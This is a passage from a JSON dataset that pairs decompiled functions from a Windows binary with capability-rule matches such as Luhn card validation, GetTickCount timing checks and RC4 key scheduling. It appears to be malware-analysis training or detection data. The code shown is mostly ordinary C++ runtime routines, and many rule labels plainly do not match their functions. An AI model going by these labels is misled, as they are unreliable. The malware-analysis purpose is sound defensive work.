            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800113e0(int64_t *arg1, uint *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int64_t arg1_00;\n    \n    uVar1 = arg1[3];\n    if (0xf < uVar1) {\n        iVar2 = *arg1;\n        arg1_00 = iVar2;\n        if (0xfff < uVar1 + 1) {\n            arg1_00 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar2 - arg1_00, uVar1 + 0x28);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    arg1[3] = 0xf;\n    arg1[2] = 0;\n    *arg1 = 0;\n    uVar4 = arg2[1];\n    uVar5 = arg2[2];\n    uVar6 = arg2[3];\n    *arg1 = *arg2;\n    *(arg1 + 4) = uVar4;\n    *(arg1 + 1) = uVar5;\n    *(arg1 + 0xc) = uVar6;\n    uVar4 = arg2[5];\n    uVar5 = arg2[6];\n    uVar6 = arg2[7];\n    *(arg1 + 2) = arg2[4];\n    *(arg1 + 0x14) = uVar4;\n    *(arg1 + 3) = uVar5;\n    *(arg1 + 0x1c) = uVar6;\n    *(arg2 + 4) = 0;\n    *(arg2 + 6) = 0xf;\n    *arg2 = 0;\n    return;\n}\n",
        "token_count": 459
    },
    "180011cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011cf0(ulong noname_0, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t arg1;\n    int64_t iVar3;\n    uint64_t arg1_00;\n    \n    arg1 = arg2 * 2;\n    if (arg2 < 0x8000000000000000) {\n        if (arg1 < 0x1000) {\n            if (arg1 == 0) {\n                return;\n            }\n            do {\n                iVar3 = fcn.1800b35a0(arg1);\n                if (iVar3 != 0) {\n                    return;\n                }\n                iVar2 = fcn.1800c086c(arg1);\n            } while (iVar2 != 0);\n            if (arg1 == 0xffffffffffffffff) {\n                fcn.180090898();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18006df20();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    else {\n        arg1 = 0xffffffffffffffff;\n    }\n    arg1_00 = arg1 + 0x27;\n    if (arg1_00 <= arg1) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(arg1_00);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *((iVar3 + 0x27U & 0xffffffffffffffe0) - 8) = iVar3;\n    return;\n}\n",
        "token_count": 389
    },
    "18008fb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18008fb2c(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    do {\n        iVar2 = fcn.1800b35a0(arg1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar3 = fcn.1800c086c(arg1);\n    } while (iVar3 != 0);\n    if (arg1 == -1) {\n        fcn.180090898();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.18006df20();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 166
    },
    "1800125d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong * fcn.1800125d0(ulong *arg1, ulong *arg2, ulong *arg3)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    iVar2 = arg2[2] + arg3[2];\n    if (CARRY8(arg2[2], arg3[2])) {\n        iVar2 = -1;\n    }\n    fcn.18000d550(arg1, iVar2);\n    uVar1 = arg2[2];\n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    iVar2 = arg1[2];\n    if (arg1[3] - iVar2 < uVar1) {\n        fcn.180013690(arg1, uVar1, 0, arg2);\n    }\n    else {\n        arg1[2] = uVar1 + iVar2;\n        puVar3 = arg1;\n        if (7 < arg1[3]) {\n            puVar3 = *arg1;\n        }\n        fcn.1800ade80(puVar3 + iVar2 * 2, arg2, uVar1 * 2);\n        *(puVar3 + (uVar1 + iVar2) * 2) = 0;\n    }\n    uVar1 = arg3[2];\n    if (7 < arg3[3]) {\n        arg3 = *arg3;\n    }\n    iVar2 = arg1[2];\n    if (arg1[3] - iVar2 < uVar1) {\n        fcn.180013690(arg1, uVar1, 0, arg3);\n    }\n    else {\n        arg1[2] = iVar2 + uVar1;\n        puVar3 = arg1;\n        if (7 < arg1[3]) {\n            puVar3 = *arg1;\n        }\n        fcn.1800ade80(puVar3 + iVar2 * 2, arg3, uVar1 * 2);\n        *(puVar3 + (iVar2 + uVar1) * 2) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 498
    },
    "180013aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180013aa0(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t arg1_00;\n    \n    if (arg1 != arg2) {\n        do {\n            if (7 < arg1[3]) {\n                iVar2 = *arg1;\n                iVar1 = arg1[3] * 2;\n                arg1_00 = iVar2;\n                if (0xfff < iVar1 + 2U) {\n                    arg1_00 = *(iVar2 + -8);\n                    if (0x1f < (iVar2 - arg1_00) - 8U) {\n                        fcn.1800b3528(iVar2 - arg1_00, iVar1 + 0x29);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            arg1[2] = 0;\n            arg1[3] = 7;\n            *arg1 = 0;\n            arg1 = arg1 + 4;\n        } while (arg1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "180013b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180013b30(int64_t *arg1, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t arg1_00;\n    \n    if (arg1 != arg2) {\n        do {\n            uVar1 = arg1[3];\n            if (0xf < uVar1) {\n                iVar2 = *arg1;\n                arg1_00 = iVar2;\n                if (0xfff < uVar1 + 1) {\n                    arg1_00 = *(iVar2 + -8);\n                    if (0x1f < (iVar2 - arg1_00) - 8U) {\n                        fcn.1800b3528(iVar2 - arg1_00, uVar1 + 0x28);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            arg1[2] = 0;\n            arg1[3] = 0xf;\n            *arg1 = 0;\n            arg1 = arg1 + 4;\n        } while (arg1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "18001498": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.180014980(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    ulong *arg2_00;\n    uint *puVar6;\n    ulong uVar7;\n    int64_t arg1_00;\n    uchar auStack192 [8];\n    int64_t iStack184;\n    uchar uStack176;\n    int64_t iStack168;\n    uchar uStack160;\n    int64_t iStack152;\n    ushort uStack144;\n    int64_t iStack136;\n    ushort uStack128;\n    int64_t iStack120;\n    uchar uStack112;\n    int64_t iStack104;\n    uchar uStack96;\n    ulong uStack88;\n    code **appcStack80 [2];\n    int64_t aiStack64 [3];\n    uint64_t uStack40;\n    \n    uStack88 = 0xfffffffffffffffe;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar5 = fcn.18008fb2c(0x20);\n        appcStack80[0] = ppcVar5;\n        arg2_00 = fcn.180002500(arg2, aiStack64);\n        if (0xf < arg2_00[3]) {\n            arg2_00 = *arg2_00;\n        }\n        fcn.18006da30(auStack192, 0);\n        iStack184 = 0;\n        uStack176 = 0;\n        iStack168 = 0;\n        uStack160 = 0;\n        iStack152 = 0;\n        uStack144 = 0;\n        iStack136 = 0;\n        uStack128 = 0;\n        iStack120 = 0;\n        uStack112 = 0;\n        iStack104 = 0;\n        uStack96 = 0;\n        if (arg2_00 == NULL) {\ncode_r0x000180014b46:\n            fcn.18006dfd0(\"bad locale name\");\n            pcVar1 = swi(3);\n            uVar7 = (*pcVar1)();\n            return uVar7;\n        }\n        fcn.180073c8c(auStack192, arg2_00);\n        *(ppcVar5 + 1) = 0;\n        *ppcVar5 = vtable.std::collate_wchar_t_.0;\n        puVar6 = fcn.18007436c(appcStack80);\n        uVar2 = puVar6[1];\n        uVar3 = puVar6[2];\n        uVar4 = puVar6[3];\n        *(ppcVar5 + 2) = *puVar6;\n        *(ppcVar5 + 0x14) = uVar2;\n        *(ppcVar5 + 3) = uVar3;\n        *(ppcVar5 + 0x1c) = uVar4;\n        *arg1 = ppcVar5;\n        fcn.180073cf8(auStack192);\n        if (iStack104 != 0) {\n            fcn.1800b2bb8(iStack104);\n        }\n        iStack104 = 0;\n        if (iStack120 != 0) {\n            fcn.1800b2bb8(iStack120);\n        }\n        iStack120 = 0;\n        if (iStack136 != 0) {\n            fcn.1800b2bb8(iStack136);\n        }\n        iStack136 = 0;\n        if (iStack152 != 0) {\n            fcn.1800b2bb8(iStack152);\n        }\n        iStack152 = 0;\n        if (iStack168 != 0) {\n            fcn.1800b2bb8(iStack168);\n        }\n        iStack168 = 0;\n        if (iStack184 != 0) {\n            fcn.1800b2bb8(iStack184);\n        }\n        iStack184 = 0;\n        fcn.18006dab0(auStack192);\n        if (0xf < uStack40) {\n            arg1_00 = aiStack64[0];\n            if (0xfff < uStack40 + 1) {\n                arg1_00 = *(aiStack64[0] + -8);\n                if (0x1f < (aiStack64[0] - arg1_00) - 8U) {\n                    fcn.1800b3528(arg1_00, uStack40 + 0x28);\n                    goto code_r0x000180014b46;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1050
    },
    "1800150d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.1800150d0(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    \n    iVar3 = arg2;\n    if (0xfff < arg3 * 0x30) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, arg3 * 0x30 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 310
    },
    "1800159b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800159b0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    \n    iVar1 = *arg1;\n    if (iVar1 != 0) {\n        uVar3 = ((arg1[2] - iVar1) / 0x18) * 0x18;\n        arg1_00 = iVar1;\n        if (0xfff < uVar3) {\n            arg1_00 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar1 - arg1_00, uVar3 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "180015a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180015a30(ulong noname_0, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t arg1;\n    int64_t iVar3;\n    uint64_t arg1_00;\n    \n    arg1 = arg2 * 4;\n    if (arg2 < 0x4000000000000000) {\n        if (arg1 < 0x1000) {\n            if (arg1 == 0) {\n                return;\n            }\n            do {\n                iVar3 = fcn.1800b35a0(arg1);\n                if (iVar3 != 0) {\n                    return;\n                }\n                iVar2 = fcn.1800c086c(arg1);\n            } while (iVar2 != 0);\n            if (arg1 == 0xffffffffffffffff) {\n                fcn.180090898();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18006df20();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    else {\n        arg1 = 0xffffffffffffffff;\n    }\n    arg1_00 = arg1 + 0x27;\n    if (arg1_00 <= arg1) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(arg1_00);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *((iVar3 + 0x27U & 0xffffffffffffffe0) - 8) = iVar3;\n    return;\n}\n",
        "token_count": 389
    },
    "180015eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.180015eb0(int64_t arg1, ulong arg2)\n\n{\n    uchar (*pauVar1) [16];\n    int64_t iVar2;\n    \n    pauVar1 = fcn.18008fb2c(0x20);\n    *pauVar1 = ZEXT816(0);\n    pauVar1[1] = ZEXT816(0);\n    *(*pauVar1 + 8) = arg2;\n    **pauVar1 = vtable.std::_Node_base.0;\n    *(pauVar1[1] + 8) = 0;\n    *(*pauVar1 + 0xc) = 0;\n    *pauVar1[1] = 0;\n    *(pauVar1[1] + 8) = *(arg1 + 8);\n    iVar2 = *(arg1 + 8);\n    if (*(iVar2 + 0x10) != 0) {\n        *pauVar1[1] = *(iVar2 + 0x10);\n        *(*(*(arg1 + 8) + 0x10) + 0x18) = pauVar1;\n        iVar2 = *(arg1 + 8);\n    }\n    *(iVar2 + 0x10) = pauVar1;\n    *(arg1 + 8) = pauVar1;\n    return pauVar1;\n}\n",
        "token_count": 304
    },
    "1800161d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800161d0(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    iVar2 = *(arg1 + 0x28);\n    if (iVar2 != 0) {\n        uVar4 = *(arg1 + 0x38) - iVar2 & 0xfffffffffffffff0;\n        iVar3 = iVar2;\n        if (0xfff < uVar4) {\n            iVar3 = *(iVar2 + -8);\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x000180016276;\n        }\n        fcn.18008fb24(iVar3);\n        *(arg1 + 0x28) = 0;\n        *(arg1 + 0x30) = 0;\n        *(arg1 + 0x38) = 0;\n    }\n    iVar2 = *(arg1 + 8);\n    if (iVar2 != 0) {\n        uVar4 = *(arg1 + 0x18) - iVar2 & 0xfffffffffffffffc;\n        iVar3 = iVar2;\n        if (0xfff < uVar4) {\n            iVar3 = *(iVar2 + -8);\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) {\ncode_r0x000180016276:\n                fcn.1800b3528(iVar2, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        *(arg1 + 8) = 0;\n        *(arg1 + 0x10) = 0;\n        *(arg1 + 0x18) = 0;\n    }\n    return;\n}\n",
        "token_count": 428
    },
    "1800162e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800162e0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    int64_t in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    uint32_t in_stack_00000040;\n    \n    *(arg1 + 8) = 0;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x38) = 0;\n    *(arg1 + 0x48) = 0;\n    *(arg1 + 0x50) = 0;\n    *(arg1 + 0x58) = 0;\n    *(arg1 + 0x60) = 0;\n    *(arg1 + 0x68) = 0;\n    *(arg1 + 0x70) = 0;\n    *(arg1 + 0x78) = 0;\n    *(arg1 + 0x80) = 0;\n    *(arg1 + 0x88) = 0;\n    *(arg1 + 0x90) = 0;\n    *(arg1 + 0xa0) = arg3;\n    *(arg1 + 0xa8) = arg2;\n    *(arg1 + 0xb0) = in_stack_00000028;\n    *(arg1 + 0xb8) = in_stack_00000038;\n    *(arg1 + 0xbc) = in_stack_00000040;\n    *(arg1 + 0xc0) = 0;\n    *(arg1 + 0xc4) = in_stack_00000030;\n    if (((*(in_stack_00000028 + 0xc) & 8) == 0) || ((in_stack_00000040 & 0x10) != 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(arg1 + 200) = uVar1;\n    *(arg1 + 0xd0) = arg4;\n    fcn.180016420(arg1 + 0x80, *(in_stack_00000028 + 0x24));\n    return arg1;\n}\n",
        "token_count": 553
    },
    "18001642": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180016420(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    \n    arg1_00 = arg1[1];\n    iVar2 = *arg1;\n    uVar1 = arg1_00 - iVar2 >> 4;\n    if (arg2 < uVar1) {\n        arg1[1] = arg2 * 0x10 + iVar2;\n        return;\n    }\n    if (uVar1 < arg2) {\n        if (arg1[2] - iVar2 >> 4 < arg2) {\n            fcn.180019c30(arg1, arg2);\n            return;\n        }\n        iVar2 = arg2 - uVar1;\n        if (iVar2 != 0) {\n            fcn.1800ae290(arg1_00, 0, iVar2 * 0x10);\n            arg1_00 = arg1_00 + iVar2 * 0x10;\n        }\n        arg1[1] = arg1_00;\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "1800178b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1800178b0(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    uint64_t arg2_00;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    iVar3 = *(arg1 + 0x10);\n    puVar1 = *(arg1 + 0x18);\n    arg2_00 = arg2;\n    iVar2 = (puVar1 - iVar3) / 6 + (puVar1 - iVar3 >> 0x3f);\n    uVar4 = (iVar2 >> 2) - (iVar2 >> 0x3f);\n    if (arg2_00 < uVar4) {\n        *(arg1 + 0x18) = iVar3 + arg2_00 * 0x18;\n        return;\n    }\n    if (uVar4 < arg2_00) {\n        if ((*(arg1 + 0x20) - iVar3) / 0x18 < arg2_00) {\n            fcn.18001b600(arg1 + 0x10, arg2_00);\n            return;\n        }\n        for (iVar3 = arg2_00 - uVar4; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *(puVar1 + 2) = 0;\n            puVar1 = puVar1 + 3;\n        }\n        *(arg1 + 0x18) = puVar1;\n    }\n    return;\n}\n",
        "token_count": 357
    },
    "180018c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180018c00(int64_t arg1)\n\n{\n    uchar (*arg2) [16];\n    int64_t iVar1;\n    uint8_t in_DL;\n    uchar auStack72 [32];\n    ulong uStack40;\n    uchar (*pauStack32) [16];\n    uint64_t uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack72;\n    arg2 = fcn.18008fb2c(0x28);\n    *arg2 = ZEXT816(0);\n    arg2[1] = ZEXT816(0);\n    *(*arg2 + 8) = in_DL + 10;\n    *(*arg2 + 0xc) = 0;\n    *arg2[1] = 0;\n    *(arg2[1] + 8) = 0;\n    **arg2 = vtable.std::_Node_assert.0;\n    *arg2[2] = 0;\n    pauStack32 = arg2;\n    pauStack32 = fcn.18008fb2c(0x20);\n    *pauStack32 = ZEXT816(0);\n    pauStack32[1] = ZEXT816(0);\n    **pauStack32 = vtable.std::_Node_base.0;\n    *(*pauStack32 + 8) = 1;\n    *pauStack32[1] = 0;\n    *(pauStack32[1] + 8) = 0;\n    *(arg2[1] + 8) = *(arg1 + 0x48);\n    iVar1 = *(arg1 + 0x48);\n    if (*(iVar1 + 0x10) != 0) {\n        *arg2[1] = *(iVar1 + 0x10);\n        *(*(*(arg1 + 0x48) + 0x10) + 0x18) = arg2;\n        iVar1 = *(arg1 + 0x48);\n    }\n    *(iVar1 + 0x10) = arg2;\n    *arg2[2] = pauStack32;\n    *(pauStack32[1] + 8) = arg2;\n    *(arg1 + 0x48) = pauStack32;\n    fcn.180015400(arg1);\n    fcn.180015670(arg1 + 0x40, arg2);\n    *(arg1 + 0x48) = arg2;\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 562
    },
    "180018d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180018d20(int64_t arg1)\n\n{\n    uchar (*pauVar1) [16];\n    int64_t iVar2;\n    \n    pauVar1 = fcn.18008fb2c(0x50);\n    *pauVar1 = ZEXT816(0);\n    pauVar1[1] = ZEXT816(0);\n    pauVar1[2] = ZEXT816(0);\n    pauVar1[3] = ZEXT816(0);\n    pauVar1[4] = ZEXT816(0);\n    *(pauVar1[1] + 8) = 0;\n    *(*pauVar1 + 8) = 7;\n    *pauVar1[1] = 0;\n    **pauVar1 = vtable.std::_Node_class_wchar_t__class_std::regex_traits_wchar_t__.0;\n    *pauVar1[2] = 0;\n    *(pauVar1[2] + 8) = 0;\n    *pauVar1[3] = 0;\n    *(pauVar1[3] + 8) = 0;\n    *pauVar1[4] = 0;\n    *(pauVar1[4] + 8) = 0;\n    *(pauVar1[1] + 8) = *(arg1 + 8);\n    iVar2 = *(arg1 + 8);\n    if (*(iVar2 + 0x10) != 0) {\n        *pauVar1[1] = *(iVar2 + 0x10);\n        *(*(*(arg1 + 8) + 0x10) + 0x18) = pauVar1;\n        iVar2 = *(arg1 + 8);\n    }\n    *(iVar2 + 0x10) = pauVar1;\n    *(arg1 + 8) = pauVar1;\n    return;\n}\n",
        "token_count": 422
    },
    "1800196b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint16_t * fcn.1800196b0(int16_t *arg1, int16_t *arg2, int16_t *arg3, int16_t *arg4)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    bool bVar4;\n    int64_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    \n    piVar3 = arg1;\n    if ((in_stack_00000030 >> 8 & 1) == 0) {\n        if ((in_stack_00000030 >> 0xb & 1) == 0) {\n            if (arg1 != arg2) {\n                do {\n                    bVar4 = arg3 == arg4;\n                    if (bVar4) goto code_r0x0001800197b6;\n                    iVar1 = *arg3;\n                    arg3 = arg3 + 1;\n                    iVar2 = *piVar3;\n                    piVar3 = piVar3 + 1;\n                    if (iVar2 != iVar1) {\n                        return arg1;\n                    }\n                } while (piVar3 != arg2);\n            }\n            bVar4 = arg3 == arg4;\ncode_r0x0001800197b6:\n            if (!bVar4) {\n                return arg1;\n            }\n            return piVar3;\n        }\n        if (arg1 != arg2) {\n            while (bVar4 = arg3 == arg4,  !bVar4) {\n                arg3 = arg3 + 1;\n                piVar3 = piVar3 + 1;\n                iVar1 = fcn.180017ba0(in_stack_00000028);\n                iVar2 = fcn.180017ba0(in_stack_00000028);\n                if (iVar1 != iVar2) {\n                    return arg1;\n                }\n                if (piVar3 == arg2) {\n                    if (arg3 != arg4) {\n                        return arg1;\n                    }\n                    return piVar3;\n                }\n            }\n            goto code_r0x000180019731;\n        }\n    }\n    else if (arg1 != arg2) {\n        do {\n            bVar4 = arg3 == arg4;\n            if (bVar4) goto code_r0x000180019731;\n            iVar1 = *arg3;\n            arg3 = arg3 + 1;\n            piVar3 = piVar3 + 1;\n            iVar1 = (**(**(in_stack_00000028 + 8) + 0x40))(*(in_stack_00000028 + 8), iVar1);\n            iVar2 = (**(**(in_stack_00000028 + 8) + 0x40))();\n            if (iVar2 != iVar1) {\n                return arg1;\n            }\n        } while (piVar3 != arg2);\n    }\n    bVar4 = arg3 == arg4;\ncode_r0x000180019731:\n    if (bVar4) {\n        arg1 = piVar3;\n    }\n    return arg1;\n}\n",
        "token_count": 667
    },
    "1800197e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.1800197e0(int16_t *arg1, int16_t *arg2, uint32_t *arg3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    \n    if (arg3 != NULL) {\n        do {\n            uVar7 = 0;\n            if (arg3[3] != 0) {\n                uVar2 = *arg3;\n                do {\n                    uVar3 = 0;\n                    piVar5 = arg1;\n                    if (uVar2 != 0) {\n                        piVar4 = *(arg3 + 4) + uVar7 * 2;\n                        do {\n                            iVar1 = *piVar5;\n                            piVar5 = piVar5 + 1;\n                            if (iVar1 != *piVar4) break;\n                            uVar3 = uVar3 + 1;\n                            piVar4 = piVar4 + 1;\n                        } while (uVar3 < uVar2);\n                    }\n                    if (piVar5 == arg2) {\n                        return arg2;\n                    }\n                    uVar6 = uVar7 + uVar2;\n                    uVar7 = uVar6;\n                } while (uVar6 < arg3[3]);\n            }\n            arg3 = *(arg3 + 6);\n        } while (arg3 != NULL);\n    }\n    return arg1;\n}\n",
        "token_count": 343
    },
    "18001a87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
